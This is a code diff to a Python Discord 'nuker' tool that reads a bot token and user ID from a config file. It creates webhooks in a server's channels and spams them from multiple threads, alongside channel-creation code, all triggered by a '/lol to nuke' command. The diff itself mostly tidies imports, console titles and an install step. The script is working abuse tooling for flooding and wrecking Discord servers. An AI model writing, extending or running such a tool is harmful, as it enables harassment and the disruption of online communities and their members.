@@ -1,61 +1,23 @@
-import sys
 import os
 import time
 import json
-import ctypes
-ctypes.windll.kernel32.SetConsoleTitleW("Nuker - 0 messages sent | Coin's Tool")
-with open("config.json") as data:
-    config = json.load(data)
-with open("nukerconfig.json") as data:
+import threading
+import httpx
+import discord
+
+# Keep all the imports on top, you can also use or operator (||) to decide bw 2 commands,
+# no need to check if the user has windows or linux.
+
+# ctypes.windll.kernel32.SetConsoleTitleW("Nitro Nuker | Coin's Tool") (stop skidding off stack, learn os)
+os.system("title [Coin's Tools] Discord Nuker")
+
+with open("configs\\nukerconfig.json") as data:
     nukerconfig = json.load(data)
-if config['pyorpython'] == '' or config['path'] == '':
-    print("Please edit the config file like so:")
-    print('''
-{
-    "pyorpython":"", -- here put py or python, based on how u run a file py [filename].py or python [filename].py
-    "path":"" --here put if u have python to path (y/n)
-}''')
-    sys.exit()
 if nukerconfig['token'] == '' or nukerconfig['userid'] == '':
     print("Please edit the nukerconfig.json file and add your bot's token and ur userid to it!")
 else:
     token = nukerconfig['token']
     useridlol = nukerconfig['userid']
-
-if config['pyorpython'] == 'py':
-    python = False
-    py = True
-else:
-    python = True
-    py = False
-
-if config['path'] == 'y':
-    path = True
-else:
-    path = False
-
-if path == True:
-    os.system("pip uninstall py-cord -y")
-    os.system("pip uninstall py-cord -y")
-    os.system("pip uninstall discord.py -y")
-    os.system("pip install py-cord")
-    os.system("pip install threads")
-    os.system("pip install httpx")
-else:
-    if python:
-        os.system("python -m pip uninstall py-cord -y")
-        os.system("python -m pip uninstall py-cord -y")
-        os.system("python -m pip uninstall discord.py -y")
-        os.system("python -m pip install py-cord")
-        os.system("python -m pip install threads")
-        os.system("python -m pip install httpx")   
-    if py:
-        os.system("py -m pip uninstall py-cord -y")
-        os.system("py -m pip uninstall py-cord -y")
-        os.system("py -m pip uninstall discord.py -y")
-        os.system("py -m pip install py-cord")
-        os.system("py -m pip install threads")
-        os.system("py -m pip install httpx")
 
 black = "\033[1;30m"
 red = "\033[1;31m"    
@@ -65,8 +27,9 @@ blue = "\033[1;34m"
 purple = "\033[1;35m"    
 cyan = "\033[1;36m"    
 white = "\033[1;37m"
-os.system("title Nuker | Coin's Tool")
-os.system("cls")
+
+os.system("cls || clear")
+
 print(f"""{red}
     
  $$$$$$\            $$\           $$\             
@@ -86,6 +49,7 @@ $$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |
 $$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
 \__|  \__| \______/ \__|  \__| \_______|\__|      {white}
 {blue}/lol to nuke{white}""")
+
 x = 0
 def increment():
     global x
@@ -106,9 +70,6 @@ def idk():
     tp = threading.Thread(target=thread_task,args=(lock,))
     tp.start()
     tp.join()
-import threading
-import httpx
-import discord
 intents = discord.Intents().all()
 bot = discord.Bot(intents=intents)
 def spam_webhook(webhook):
@@ -121,7 +82,8 @@ def spam_webhook(webhook):
             r=httpx.post(url,json=data)
             if r.status_code == 204:
                 idk()
-                ctypes.windll.kernel32.SetConsoleTitleW(f"Nuker - {x} Messages sent. | Coin's Tool")
+                # ctypes.windll.kernel32.SetConsoleTitleW(f"Nuker - {x} Messages sent. | Coin's Tool")
+                os.system(f"title Coin's Nuker - {x} Messages sent.")
             else:
                 print(f"{red}Rate Limit! {white}")
                 time.sleep(1)
@@ -131,8 +93,7 @@ def spam_webhook(webhook):
 def between(webhook):
     threading.Thread(target=spam_webhook,args=(webhook,)).start()
 async def forever_send_msg(channel):
-    webhook = await channel.create_webhook(name="coin on top")
-    #await spam_webhook(webhook=webhook)
+    webhook = await channel.create_webhook(name="Patched By Infamous Koala")
     between(webhook)
 async def create_channel(guild,name,cat):
     channel = await guild.create_text_channel(str(name),category=cat)
